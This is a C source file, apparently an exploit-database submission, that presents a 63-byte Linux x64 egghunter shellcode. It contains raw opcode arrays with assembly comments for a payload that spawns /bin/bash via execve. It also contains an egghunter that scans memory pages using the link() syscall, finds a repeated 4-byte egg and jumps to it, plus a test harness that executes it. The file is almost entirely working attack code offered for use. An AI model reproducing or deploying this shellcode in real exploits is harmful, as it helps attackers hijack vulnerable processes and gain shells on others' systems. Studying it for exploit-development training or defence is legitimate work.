// Shellcode Title:  Linux/x64 - EggHunter Execve Shellcode (63 Bytes)
// Shellcode Author: Bobby Cooke
// Tested On:        Kali Linux 5.3.0-kali3-amd64 x86_64
// Filename: Hunter.c
#include <stdio.h>
#include <string.h>
// This is the egg for our eggHunter
// the egg should be 4 bytes and be executable
#define egg "\x90\x50\x90\x50"

unsigned char shellcode[] = \
egg \
egg \
"\x48\x31\xf6"     // xor rsi, rsi
"\x48\xf7\xe6"     // mul rsi          ; rdx&rax= 0x0
"\x48\x31\xff"     // xor rdi, rdi
"\x57"             // push rdi
"\x48\x83\xc2\x68" // add rdx, 0x68
"\x52"             // push rdx
"\x48\xba\x2f\x62\x69\x6e\x2f\x62\x61\x73" // movabs rdx, 0x7361622f6e69622f ; "/bin/bas"
"\x52"             // push rdx
"\x48\x31\xd2"     // xor rdx, rdx
"\x48\x89\xe7"     // mov rdi, rsp ; rdi = Pointer -> "/bin/bash"0x00
"\xb0\x3b"         // mov al, 0x3b ; execve syscall number
"\x0f\x05";        // syscall  ; call execve("/bin/bash", NULL, NULL)

// Replace the hardcoded egg with a variable.
// This allows us to easily change the egg for our eggHunter.
unsigned char egghunter[] = \
"\x48\x31\xc9"                 // xor rcx, rcx
"\x48\xf7\xe1"                 // mul rcx
"\x48\x81\xc2\x10\x10\x55\x55" // add rdx, 0x55551010 ; Start >0 (hopefully reduce time)
"\x48\xc1\xe2\x10"             // shl rdx, 0x10       ; 0x55551010 => 0x555510100000
// nextPage:
"\x66\x81\xca\xff\x0f"         // or dx, 0xfff        ; 0xfff = 4096. Size of page
// nextAddress:
// ; int link(const char *oldpath, const char *newpath);
"\x48\xff\xc2"     // inc rdx
"\x48\x8d\x7a\x08" // lea rdi, [rdx+0x8]  ; ARG1=*oldpath
"\x48\x31\xf6"     // xor rsi, rsi        ; ARG2=*newpath
"\x48\x31\xc0"     // xor rax, rax        ; reset rax for syscall
"\x04\x56"         // add al, 0x56        ; System Call for link()
"\x0f\x05"         // syscall             ; Executes link()
"\x3c\xf2"         // cmp al, 0xf2        ; Can memory address be read?
"\x74\xe6"         // jz nextPage         ; If no, check the next memory page
"\x48\x31\xdb"     // xor rbx, rbx
"\x81\xc3\x90\x50\x90\x50"     // add ebx, 0x50905090 ; Configure Egg in RBX
"\x39\x1a"         // cmp [rdx], ebx      ; Egg?
"\x75\xde"         // jnz nextAddress     ; No Egg? Go to next memory page
"\x39\x5a\x04"     // cmp [rdx+0x4], ebx  ; second Egg?
"\x75\xd9"         // jnz nextAddress     ; No Egg? Check next memory address
"\xff\xe2";        // jmp rdx             ; EGG FOUND! Jump to Egg!

int main()
{
    printf("Memory Location of Shellcode: %p\n", shellcode);
    printf("Memory Location of EggHunter: %p\n", egghunter);
    printf("Size of Egghunter:          %d\n", strlen(egghunter));
    int (*ret)() = (int(*)())egghunter;
    ret();
}

